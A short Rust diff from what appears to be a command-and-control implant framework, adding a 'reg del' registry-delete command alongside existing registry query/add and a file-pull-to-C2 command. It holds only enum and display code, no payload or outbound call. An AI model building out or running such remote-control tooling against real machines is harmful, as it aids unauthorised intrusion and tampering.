@@ -40,10 +40,9 @@ pub enum Command {
     Move,
     /// Pulls a file from the target machine, downloading to the C2
     Pull,
-    /// Query the registry
     RegQuery,
-    // Add an item to the registry
     RegAdd,
+    RegDelete,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
@@ -170,6 +169,7 @@ impl Display for Command {
             Command::Pull => "Pull",
             Command::RegQuery => "reg query",
             Command::RegAdd => "reg add",
+            Command::RegDelete => "reg del",
         };
 
         write!(f, "{choice}")
@@ -204,6 +204,7 @@ pub enum AdminCommand {
     BuildAllBins(BuildAllBins),
     RegQuery(RegQueryInner),
     RegAdd(RegAddInner),
+    RegDelete(RegQueryInner),
     Undefined,
 }
 
